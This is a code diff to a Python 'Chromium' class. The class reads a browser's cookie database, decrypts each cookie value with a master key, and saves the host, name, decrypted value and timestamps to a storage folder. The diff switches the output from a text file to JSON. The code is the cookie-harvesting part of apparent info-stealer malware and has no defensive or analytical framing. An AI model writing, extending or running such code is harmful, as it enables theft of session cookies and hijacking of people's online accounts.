@@ -1,7 +1,7 @@
-from json import loads
 from sqlite3 import connect
 from shutil import copyfile
 from base64 import b64decode
+from json import loads, dump
 from os import path, mkdir, remove
 from datetime import datetime, timedelta
 
@@ -31,7 +31,7 @@ class Chromium:
 
         if date != 86400000000 and date:
 
-            return datetime(1601, 1, 1) + timedelta(microseconds=date)
+            return str(datetime(1601, 1, 1) + timedelta(microseconds=date))
 
         else:
 
@@ -74,7 +74,9 @@ class Chromium:
 
     def __write_cookies(self, cursor, master_key):
 
-        with open(f"{self.storage_path}{self.storage_folder}/{ self.browser_name}/{self.browser_name} Cookies.txt", "a", encoding='utf-8') as cookies:
+        with open(f"{self.storage_path}{self.storage_folder}/{ self.browser_name}/{self.browser_name} Cookies.json", "a", encoding='utf-8') as cookies:
+
+            results = []
 
             for result in cursor.execute("SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies").fetchall():
 
@@ -88,11 +90,13 @@ class Chromium:
 
                 if any(filter(lambda item: item != "", [result[0], result[1], result[2], result[3], result[4], result[5], decrypted_value])):
 
-                    cookies.write(f"Host: {result[0]}\nCookie name: {result[1]}\nCookie value (decrypted): {decrypted_value}\nCreation datetime (UTC): {self.__get_chrome_datetime(result[3])}\nLast access datetime (UTC): {self.__get_chrome_datetime(result[4])}\nExpires datetime (UTC): {self.__get_chrome_datetime(result[5])}\n\n")
+                    results.append({'host': result[0], 'name': result[1], 'value': decrypted_value, 'creation_datetime': self.__get_chrome_datetime(result[3]), 'last_access_datetime': self.__get_chrome_datetime(result[4]), 'expires_datetime': self.__get_chrome_datetime(result[5])})
 
                 else:
 
                     continue
+
+            dump(results, cookies)
 
         cookies.close()
 
